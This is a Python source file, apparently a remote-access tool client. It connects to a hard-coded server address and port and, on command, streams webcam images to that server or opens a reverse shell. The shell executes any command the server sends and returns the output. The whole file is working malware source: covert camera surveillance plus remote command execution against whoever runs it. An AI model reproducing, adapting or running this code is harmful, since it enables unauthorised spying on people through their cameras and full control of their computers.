import socket
import os
import subprocess
import time
import cv2
import pickle
import struct
import threading
from queue import Queue
import errno

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1,2]
queue = Queue()

"""
Funkcja camera musi nasłuchiwać komendy zakończena od strony serwera.
Jeśli komenda nie występuje to wysyła obraz z kamery do serwera.
"""


#HOST = '157.245.34.67'
HOST = '192.168.1.227'
PORT = 5000

def camera(client_socket):
    encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 90]
    cam = cv2.VideoCapture(0)
    cam.set(3, 720)
    cam.set(4, 480)
    img_counter = 0
    client_socket.setblocking(0)
    while True: 
        command = client_socket.recv(1024)
        if not command:
            ret, frame = cam.read()
            result, frame = cv2.imencode('.jpg', frame, encode_param)
            data = pickle.dumps(frame, 0)
            size = len(data)
            client_socket.sendall(struct.pack(">L", size) + data)
            img_counter += 1
        else:
            if command[:1].decode("utf-8") == 'q':
                break
    cam.release()

def reverseShell(client_socket):
    while True:
        data = client_socket.recv(1024)
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))
        if data[:1].decode("utf-8") == 'q':
            break
        if len(data) > 0:
            command = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = command.stdout.read() + command.stderr.read()
            output_str = output_bytes.decode("utf-8", "ignore")
            client_socket.send(str.encode(output_str + '\n' + str(os.getcwd()) + '> ', "utf-8"))

def waitForInstructions(client_socket):
    while True:
        client_socket.setblocking(1)
        print("Waiting for instructions")
        data = client_socket.recv(1024)
        if len(data) > 0:
            command = data.decode("utf-8")
            if command == 'connect':
                client_socket.send(str.encode(' '))
            elif command == '1':
                camera(client_socket)
            elif command == '2':
                reverseShell(client_socket)

# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        thread = threading.Thread(target=work)
        thread.daemon = True
        thread.start()

# Do the next job in the queue (one handles connections, other sends commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((HOST,PORT))
            waitForInstructions(client_socket)
            
        queue.task_done()

# Each list item is a new job
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()

def main():
    create_workers()
    create_jobs()
    


if __name__ == '__main__':
    main()